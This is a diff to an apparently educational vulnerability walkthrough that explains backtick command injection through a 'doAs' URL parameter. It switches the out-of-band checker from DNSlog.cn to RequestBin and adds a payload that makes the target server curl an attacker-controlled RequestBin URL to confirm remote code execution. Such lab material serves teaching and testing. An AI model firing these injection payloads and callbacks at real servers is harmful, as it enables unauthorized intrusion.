@@ -163,12 +163,25 @@ curl -X "GET" http://<IP>:8080/?doAs=`<command_to_execute>`
 
 The backtick is the start of an instruction to bash to evaluate what you type as a command. Everything you type between backticks (`) is evaluated  by the shell before the main command and the output of that execution is used by that command, just as if you'd type that output at that place in the command line. So, the command between the backticks inside the URL will be firstly intepreted by our shell and then by the target shell.
 
-To read the output of the command and to check if that command was executed on the vulnerable server, we will send a request to [DNSlog.cn](http://dnslog.cn/). [DNSlog.cn](http://dnslog.cn/) allows anyone to get a random subdomain under 'dbslog.cn'. The website allows you to monitor any resolution requests for the random subdomain you generated.
+To read the output of the command and to check if that command was executed on the vulnerable server, we will send a request to [RequestBin](https://requestbin.io). [RequestBin](https://requestbin.io) RequestBin gives you a URL that will collect requests made to it and let you inspect them in a human-friendly way.
 
-You need just to create a subdomain by using the Get SubDomain Button:
+You need just to create a subdomain by using the Create a RequestBin button:
 
-<img src="./assets/dnslog.png" width=600 height=300>
+<img src="./assets/requestbin.png" width=600 height=300>
 
+Now you have an associated URL to your request bin and you can send requests to this URL getting all that information needed:
+
+```
+curl <REQUEST-BIN-URL>
+```
+
+<img src="./assets/requestbin2.png" width=600 height=300>
+
+To check if the server is vulnerable and the command was successfully executed, we would like the target server to communicate with our created logger: we will make the target to send a GET request to our REQUEST-BIN-URL. We will introduce a curl command inside the backticks that we discussed before.
+
+```
+curl -X "GET" http://<IP>:8080/?doAs=`curl <REQUEST-BIN-URL>`
+```
 
 # Further reading
 
